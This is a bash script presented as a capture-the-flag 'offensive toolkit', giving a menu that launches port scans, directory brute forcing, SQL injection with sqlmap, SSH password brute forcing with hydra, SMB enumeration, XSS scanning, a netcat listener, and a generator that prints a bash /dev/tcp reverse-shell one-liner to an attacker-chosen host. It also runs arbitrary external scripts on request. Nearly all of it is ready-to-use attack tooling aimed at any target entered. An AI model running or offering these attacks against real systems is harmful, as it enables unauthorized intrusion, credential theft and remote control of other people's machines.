#!/bin/bash

# ================= CTFGUI ARSENAL ===================
# Advanced Offensive Toolkit for CTF's
# For Ethical Hacking use only!
# Developed by Taylor Christian Newsome | ClumsyLulz
# ===================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

function generate_payload() {
    read -p "Enter your IP (LHOST): " lhost
    read -p "Enter your port (LPORT): " lport
    echo -e "${YELLOW}[*] Reverse shell payload:${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
}

function start_listener() {
    read -p "Enter port to listen on: " lport
    echo -e "${YELLOW}[*] Starting listener on port $lport...${NC}"
    nc -lvnp "$lport"
}

function auto_recon() {
    read -p "Enter target IP or URL: " target
    echo -e "${YELLOW}[*] Starting automated recon on $target...${NC}"
    nmap -sC -sV -Pn "$target" -oN nmap_scan.txt &
    whatweb "$target" > web_tech.txt &
    nuclei -u "$target" -t cves/ -severity critical,high,medium -o nuclei_report.txt &
    ffuf -u "$target"/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf.txt &
    wait
    echo -e "${GREEN}[+] Recon complete. Reports saved.${NC}"
}

function load_modules() {
    read -p "Enter path to custom module: " mod
    if [[ -f "$mod" ]]; then
        chmod +x "$mod"
        echo -e "${YELLOW}[*] Executing external module...${NC}"
        bash "$mod"
    else
        echo -e "${RED}[-] Module not found.${NC}"
    fi
}

function menu() {
    clear
    echo -e "${GREEN}CTFGUI - Offensive Automation Interface${NC}"
    echo -e "Made by Taylor Christian Newsome"
    echo "=================================================="
    echo "1) Full TCP Port Scan"
    echo "2) Web Directory Bruteforce (Gobuster)"
    echo "3) FFUF Web Fuzzing"
    echo "4) Nikto Vulnerability Scan"
    echo "5) SQLMap SQL Injection Test"
    echo "6) SSH Brute Force (Hydra)"
    echo "7) SMB Enumeration"
    echo "8) Nuclei CVE Scanner"
    echo "9) XSStrike XSS Scan"
    echo "10) Generate Reverse Shell Payload"
    echo "11) Enum4linux SMB Recon"
    echo "12) Web Tech Recon (WhatWeb)"
    echo "13) Wordlist Generator (Cewl)"
    echo "14) Start Netcat Listener"
    echo "15) Automated Recon Chain"
    echo "16) Load External Modules"
    echo "17) Exit"
    echo "=================================================="
    read -p "Choose an option: " opt

    case $opt in
        1) read -p "Target IP: " target; nmap -p- --min-rate=10000 -T4 -Pn "$target" ;;
        2) read -p "Target URL: " target; gobuster dir -u "$target" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50 ;;
        3) read -p "Target URL: " target; ffuf -u "$target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.bak,.txt -mc all ;;
        4) read -p "Target URL: " target; nikto -host "$target" ;;
        5) read -p "Target URL: " target; sqlmap -u "$target/index.php?id=1" --batch --random-agent --level=5 --risk=3 ;;
        6) read -p "Target IP: " target; hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://"$target" ;;
        7) read -p "Target IP: " target; smbclient -L \\$target -N; crackmapexec smb "$target" --shares ;;
        8) read -p "Target URL: " target; nuclei -u "$target" -t cves/ -severity critical,high,medium ;;
        9) read -p "Target URL: " target; xsstrike -u "$target/index.php?q=test" ;;
        10) generate_payload ;;
        11) read -p "Target IP: " target; enum4linux -a "$target" ;;
        12) read -p "Target URL: " target; whatweb "$target" ;;
        13) read -p "Target URL: " target; cewl "$target" -w cewl_wordlist.txt ;;
        14) start_listener ;;
        15) auto_recon ;;
        16) load_modules ;;
        17) echo -e "${GREEN}[+] Exiting CTFGUI...${NC}"; exit 0 ;;
        *) echo -e "${RED}[-] Invalid option.${NC}" ;;
    esac
    read -p "Press [Enter] to return to menu..."
    menu
}

menu
